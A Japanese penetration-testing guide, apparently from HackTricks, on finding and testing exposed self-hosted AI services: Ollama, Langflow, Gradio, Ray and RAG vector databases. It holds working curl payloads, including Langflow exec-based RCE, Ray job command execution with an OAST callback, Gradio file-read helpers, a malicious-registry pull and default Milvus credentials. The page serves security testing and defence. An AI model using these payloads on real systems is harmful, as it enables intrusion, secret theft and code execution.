# 公開されたセルフホストAIサービス

{{#include ../banners/hacktricks-training.md}}

AI機能を構築するチームは、独自のモデルランナー、エージェントビルダー、デモUI、コンピュートクラスター、ベクトルデータベースを運用することがよくあります。これらのツールの多くは、ノートPCや閉じたラボネットワークでの利用を想定して設計されているため、**デフォルトで認証がない**か、認証を簡略化する設定が有効になっています。攻撃者がそのようなサービスにアクセスできる場合、通常、影響は次のいずれかに分類されます。

- GPUやモデルの無償利用、プライベートモデルの窃取。
- プロンプト、ドキュメント、埋め込みのleak。
- プロセス環境変数に含まれるシークレット（LLMプロバイダーのキー、クラウド認証情報）のleak。
- これらのAPIの中には、**機能として**コードを実行するものがあるため、コード実行。

このページでは、これらのサービスを見つける方法と、各種APIでテストすべき項目について説明します。セルフホスト型推論サーバーの強化とllama.cppの`/slots` leakについては、[AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening)を参照してください。悪意のあるモデルファイルについては、[AI Models RCE](AI-Models-RCE.md)を参照してください。

## フィンガープリンティング

認証情報なしで以下のリクエストを送信します。想定されるフィールドを含むJSON応答で製品を特定でき、多くの場合はバージョンも判明するため、以下のどのチェックが適用されるか判断できます。ポートは、ドキュメントに記載されたデフォルト値、または公式の実行例で使われているポートです。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| 製品 | 一般的なポート | 認証なしのリクエスト | 識別できる情報 |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | バージョンJSON、ローカルモデルの一覧 |
| Langflow | 7860 | `GET /api/v1/version` | LangflowのバージョンJSON |
| Gradio | 7860 | `GET /config` | GradioのバージョンとコンポーネントIDを含むアプリ設定 |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`、送信済みジョブの一覧 |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat値、Chromaのバージョン |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrantのバージョン、コレクション一覧 |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviateのバージョン、クラス |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | コレクション一覧、または認証エラー |

これらのサービスは、リバースプロキシのパスプレフィックス（例: `/ollama/`や`/ray/`）の背後に公開されていることもよくあります。そのため、JavaScriptバンドルやAPIドキュメントから見つかったプレフィックス配下でも、リクエストを繰り返してください。

## 認証なしで利用できる推論APIとモデル管理API

モデルランナーは通常、推論ルートと管理ルートを組み合わせた単一のREST APIを公開します。Ollamaはその好例です。組み込みの認証機能はなく、デフォルトでは`127.0.0.1:11434`にバインドされますが、`OLLAMA_HOST`でバインドアドレスを変更できます。<sup>[[1]](#references)[[15]](#references)</sup> 公式Dockerイメージはコンテナ内で`OLLAMA_HOST=0.0.0.0:11434`を設定し、`EXPOSE 11434`を宣言しています。また、`USER`命令がないため、サーバーはコンテナ内でrootとして実行されます。<sup>[[16]](#references)</sup> `EXPOSE`はホスト上でポートを公開しないため、ホストから到達できるかどうかはデプロイ方法によります。ドキュメントに記載された`docker run`コマンドでは`-p 11434:11434`を使っており、ホストIPを指定しない場合、Dockerはこのようなポートマッピングをホストの全インターフェースで公開します。<sup>[[17]](#references)[[18]](#references)</sup>

各ルート群によって攻撃者ができること:<sup>[[2]](#references)</sup>

| ルート | 認証がない場合の影響 |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | プライベートなカスタムモデルを含む、ローカルモデルとロード済みモデルの一覧 |
| `POST /api/show` | Modelfile、テンプレート、**システムプロンプト**などのモデル詳細 |
| `POST /api/generate`, `/api/chat`, `/api/embed` | 被害者のハードウェアで推論を無償実行 |
| `POST /api/pull`, `/api/push` | 攻撃者が指定したレジストリからサーバーにモデルをダウンロードさせる、またはモデルをアップロードさせる |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | モデルの作成、上書き、削除 |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

credentialsなしで返されたモデル一覧だけでも、すでに露出が確認できます。カスタムモデルには、`/api/show` で取得できる内部 system prompt が含まれていることがよくあります。ホストへの pull が成功すれば、サーバーが攻撃者の指定した registry から manifest を取得することが確認できます。自分の registry に対する `/api/push` は、露出をモデル窃取に変えます。実際のターゲットに対して create または delete の route を呼び出さないでください。

Registry pull は、サーバーがリモートの manifest の値を使って blob を保存するため、parser 攻撃の攻撃面にもなります。Probllama（CVE-2024-37032、Ollama 0.1.34 で修正）では、manifest の `digest` が検証されずにファイル名として使われていました。そのため、悪意のある registry は `../` の並びを使い、blobs ディレクトリ外にファイルを書き込むことができました。digest がローカルファイルを指すように細工した manifest を push すると、そのファイルが攻撃者の registry に leak しました。Wiz は、サーバーが root として動作する Docker で、共有ライブラリを書き込み、`/etc/ld.so.preload` に追加したうえで `/api/chat` を呼び出し、新しいプロセスにそのライブラリをロードさせて RCE を達成しました。<sup>[[15]](#references)</sup> Runner が任意の registry から pull できる場合は、manifest のフィールドをどのようにパスに変換するか確認してください。

## 設計上コードを実行するAPI

関連項目: [Flowiseのリクエストごとのworkflow-code overrides](../pentesting-web/server-side-javascript-injection.md#per-request-workflow-code-overrides-flowise)。

### Job submission API

分散コンピューティングフレームワークでは、コード実行が主な機能です。ダッシュボードポート（8265）の Ray Jobs API は、`entrypoint` の shell command を受け取り、クラスター上で実行します。<sup>[[19]](#references)</sup> Oligo の ShadowRay 調査によると、Jobs API には認証がなく、ダッシュボードは `0.0.0.0` に bind します。Ray は管理されたネットワーク内でのみ実行されることを想定しているため、対応する CVE-2023-48022 の判定には異論があります。<sup>[[20]](#references)</sup> Ray 2.52.0 では、任意で有効にできる token authentication（`RAY_AUTH_MODE=token`）が追加されました。Ray 2.59 では、`ray.init()` で起動したローカルクラスターに対して、これがデフォルトで有効になります。利用可能な token がない状態でも、`ray start --head` は認証なしで起動できます。Ray は、2.61 でより広範なデフォルト認証の導入を予定しているため、ダッシュボードが公開されていると思い込まず、デプロイ済みのバージョンと起動モードを確認してください。<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

この種のダッシュボードには、古いバージョンで調査する価値のある補助ルートもあります。Ray 2.8.1 より前では、`/log_proxy?url=` は任意の HTTP(S) URL を取得し（クラウドメタデータへの SSRF）、`/api/v0/logs/file` は任意の `filename` パスを受け付けていました。どちらも認証は不要でした。<sup>[[8]](#references)</sup>

### 関数定義を実行するコード「検証」エンドポイント

カスタム Python コンポーネントを受け付けるエージェント構築ツールの中には、`ast` でコードを解析し、`exec()` で関数定義だけを実行してコードを「検証」するものがあります。これは安全ではありません。Python は関数を定義するときに**デコレーターとデフォルト引数値を評価する**ため、関数本体が実行されなくても、そこに記述されたコードは実行されます。Langflow の `POST /api/v1/validate/code` はこの方式で動作し、1.3.0 より前は認証も不要でした（CVE-2025-3248）。コマンド出力を含む例外を発生させると、エンドポイントはレスポンスにその出力を返します。<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

ユーザーコードをコンパイル、lint、または「チェック」するエンドポイントでは、このパターンをテストし、証明にはDNS callbackを優先してください。

### 自動ログインとデフォルトのsuperuser tokenルート

シングルユーザー向けツールには、すべての訪問者を管理者としてログインさせるショートカットが組み込まれていることがよくあります。Langflowでは、`AUTO_LOGIN`が有効な場合、`GET /api/v1/auto_login`は任意の呼び出し元にデフォルトのsuperuserのtokenを返します。無効な場合、このルートは`Auto login is disabled.`と応答します。<sup>[[23]](#references)</sup> Langflow OSS 1.0.0から1.10.0では、デフォルトで有効でした（CVE-2026-9103）。これを上記の認証済みコード検証ルートと連鎖させると、未認証のRCEが再現します（CVE-2026-9198、Harish Kollaが報告）。<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> 現行の公式リリースパッケージとDockerイメージでは自動ログインが無効化され、superuserのパスワードが必要ですが、開発ブランチでは有効なままです。<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

コード実行ができなくても、superuser token があればすべての flow と保存済みの provider credentials にアクセスできます。自動テストにおける関連する前提条件の確認については、[Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md) を参照してください。

## ML demo UI のファイル配信ルートと RPC ルート

ML demo framework は汎用ルートを通じてアップロード済みおよび生成済みのファイルを配信し、frontend からサーバー側の component helper を呼び出せるようにします。Gradio はこのために `/config`、`/upload`、`/file=<path>` を公開しています。<sup>[[5]](#references)</sup> 同様の framework では、次の 2 つのパターンをテストする価値があります。

- **アップロード用サブディレクトリからの Traversal:** ファイルルートがパスの先頭が temp folder 内であることしか確認しない場合、ファイルをアップロードしてサブディレクトリを作成し、`../` または `%2e%2e%2f` でその外へ移動します。Gradio 4.0 から 4.10（CVE-2023-51449）はこの方法で脆弱でした。<sup>[[26]](#references)[[27]](#references)</sup> クライアントによるパスの正規化を避けるため、`curl --path-as-is` を使ってリクエストを送信します。
- **任意のメソッドディスパッチ:** user input を使って `getattr(component, fn_name)` を呼び出す endpoint では、攻撃者が内部 helper を呼び出せます。4.13.0 より前の Gradio の `/component_server` はこの処理を行っていました。4.3 から 4.12 では、`move_resource_to_block_cache` が任意のローカルファイルを cache にコピーし、`/file=` からダウンロードできました。3.47 から 3.50.2 では、他の helper によりファイル読み取りと full-read SSRF が可能でした。<sup>[[26]](#references)[[28]](#references)</sup> 修正済みのサーバーでは、server function としてマークされていない helper に対して `Function not found.` と応答します。<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Hugging Face Spacesでは、Space secretsは環境変数なので、`/proc/self/environ`が最も価値の高いファイルです。Horizon3はHTTPの`Range`ヘッダーを使ってこれを読み取りました。<sup>[[26]](#references)</sup>

## RAGで使用されるベクトルデータベース

RAGは、元のドキュメントのチャンク、そのembedding、メタデータをベクトルデータベースに保存し、assistantは上位の検索結果をプロンプトに含めます。そのため、読み取りアクセスによって、プライベートなドキュメントの**プレーンテキストがleak**します。書き込みアクセスがあれば、攻撃者はチャンクを挿入し、後で他のユーザーのプロンプトに取得させることができます。これは永続的な間接的prompt injectionです（[AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)を参照）。

セルフホストのベクトルデータベースでは、認証が設定されているか、匿名アクセスが有効になっているかを確認してください。

- **Qdrant**: 自分でデプロイしたインスタンスは、認証なしで全インターフェースをリッスンします。設定されている場合、キーは`api-key`ヘッダーまたは`Authorization: Bearer`に指定します。読み取り専用キーやコレクション単位のキーを設定できます。<sup>[[11]](#references)</sup>
- **Chroma**: 認証はデフォルトで無効です。トークン認証では`Authorization`または`X-Chroma-Token`を使用します。<sup>[[29]](#references)</sup>
- **Weaviate**: 匿名アクセスが有効な場合、認証情報なしのリクエストは`user: anonymous`として認証され、そのユーザーに付与された権限でアクセスできます。<sup>[[30]](#references)</sup>
- **Milvus**: `common.security.authorizationEnabled`が`true`でない限り、認証は無効です。有効な場合、デフォルトの`root`ユーザーのパスワードは`Milvus`で、トークン形式は`username:password`です。<sup>[[31]](#references)[[14]](#references)</sup>

認証情報なしでプライベートデータを含むレスポンスが返る場合、情報が露出しています。認証が有効な場合は、変更されていないデフォルトアカウントも別途評価してください。<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

ペイロードにドキュメントのテキスト、ユーザー識別子、テナント名が含まれていないか確認してください。本番データを汚染せずに書き込み権限を示すには、範囲で許可されている場合に限り、明確な名前を付けた空のコレクションを作成し、直ちに削除してください。

これらのサーバーでは、認証が間に合わない場合もあります。Chroma の Python FastAPI server（1.0.0 から少なくとも 1.5.8 まで、CVE-2026-45829）では、コレクション作成ルートが認証チェックより前に、クライアントから指定された embedding function を構築していました。`trust_remote_code: true` を指定した攻撃者管理下の Hugging Face model を参照する設定では、リクエストが拒否されても攻撃者のコードが実行されました。Rust frontend は影響を受けませんでした。<sup>[[32]](#references)</sup> リクエストに model または plugin の設定が含まれる場合は、認証情報なしでテストし、model repository へのアウトバウンド fetch が発生しないか確認してください。

## References

- [1] [Ollama FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API ドキュメント](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow ソース - API v1 エンドポイント](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio ソース - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio ソース - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray ソース - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray バージョン 2.6.3、2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma ソース - Python クライアントのデフォルト設定](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma ソース - FastAPI server のルート](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - セキュリティ](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI 仕様](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI 仕様](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Milvus Server への接続](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ollama のリモートコード実行の脆弱性（CVE-2024-37032）](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker ドキュメント](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - ポートの公開と外部への公開](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: AI ワークロードを標的とした、実環境で悪用された初の既知の攻撃キャンペーン](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray token authentication](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - どんなに速くても危険: Python Exec を悪用した Langflow AI の認証なし RCE](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow ソース - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Gradio のファイル読み取り脆弱性を悪用して Hugging Face Spaces からシークレットを窃取](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio アドバイザリ GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio の `/component_server` 修正コミット](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma ネイティブ認証](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - 認証](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - ユーザーアクセスの認証](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast: 認証前に配信](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [IBM Security Bulletin - Auto-Login バイパスとコード検証による認証なしリモートコード実行（CVE-2026-9198）](https://www.ibm.com/support/pages/node/7278927)
